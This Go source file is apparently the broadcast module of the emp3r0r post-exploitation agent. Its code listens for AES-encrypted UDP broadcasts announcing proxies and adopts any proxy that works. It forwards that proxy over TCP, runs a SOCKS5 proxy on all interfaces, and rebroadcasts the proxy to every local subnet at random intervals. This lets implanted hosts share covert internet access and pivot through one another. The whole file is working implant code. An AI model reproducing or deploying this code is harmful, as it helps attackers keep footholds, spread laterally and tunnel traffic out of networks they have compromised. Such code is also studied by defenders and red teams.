package agent

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// BroadcastServer listen on a UDP port for broadcasts
// wait for some other agents to announce their internet proxy
func BroadcastServer(ctx context.Context, cancel context.CancelFunc) (err error) {
	defer cancel()
	pc, err := net.ListenPacket("udp4", ":"+BroadcastPort)
	if err != nil {
		return
	}
	defer pc.Close()

	buf := make([]byte, 1024)

	// keep listening
	for ctx.Err() == nil {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			log.Printf("cannot read: %v", err)
			continue
		}

		// decrypt broadcast message
		decMsg := tun.AESDecrypt(AESKey, string(buf[:n]))
		if decMsg == "" {
			log.Printf("%x cannot be decrypted", buf[:n])
			continue
		}
		log.Printf("BroadcastServer: %s sent this: %s\n", addr, decMsg)
		if AgentProxy != "" && tun.IsProxyOK(AgentProxy) {
			log.Printf("BroadcastServer: %s already set and working fine\n", AgentProxy)
			continue
		}
		if tun.IsProxyOK(decMsg) {
			AgentProxy = decMsg
			log.Printf("BroadcastServer: %s set as AgentProxy\n", AgentProxy)

			// pass the proxy to others
			log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", AgentProxy)
			sl := strings.Split(AgentProxy, "//")
			if len(sl) < 2 {
				log.Printf("TCPFwd: invalid proxy addr: %s", AgentProxy)
				continue
			}
			go func() {
				err = tun.TCPFwd(sl[1], ProxyPort, ctx, cancel)
				if err != nil {
					log.Print("TCPFwd: ", err)
				}
			}()
			go StartBroadcast(false, ctx, cancel)
		}
	}
	return
}

// BroadcastMsg send a broadcast message on a network
func BroadcastMsg(msg, dst string) (err error) {
	pc, err := net.ListenPacket("udp4", ":8887")
	if err != nil {
		return
	}
	defer pc.Close()

	addr, err := net.ResolveUDPAddr("udp4", fmt.Sprintf("%s:%s", dst, BroadcastPort))
	if err != nil {
		return
	}

	// encrypt message
	encMsg := tun.AESEncrypt(AESKey, msg)
	if encMsg == "" {
		return fmt.Errorf("failed to encrypt %s", msg)
	}

	_, err = pc.WriteTo([]byte(encMsg), addr)
	log.Printf("BroadcastMsg: sent %s (%s) to %s", encMsg, msg, dst)
	return
}

func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
	if start_socks5 {
		// start a socks5 proxy
		Socks5Proxy("on", "0.0.0.0:"+ProxyPort)
		defer Socks5Proxy("off", "0.0.0.0:"+ProxyPort)
	}

	defer func() {
		log.Print("Broadcasting stopped")
		cancel()
	}()
	for ctx.Err() == nil {
		log.Print("Broadcasting our proxy...")
		time.Sleep(time.Duration(util.RandInt(10, 120)) * time.Second)
		ips := tun.IPaddr()
		for _, netip := range ips {
			proxyMsg := fmt.Sprintf("socks5://%s:%s", netip.IP.String(), ProxyPort)
			broadcastAddr := tun.IPbroadcastAddr(netip)
			if broadcastAddr == "" {
				continue
			}
			err := BroadcastMsg(proxyMsg, broadcastAddr)
			if err != nil {
				log.Printf("BroadcastMsg failed: %v", err)
			}
		}
	}
}
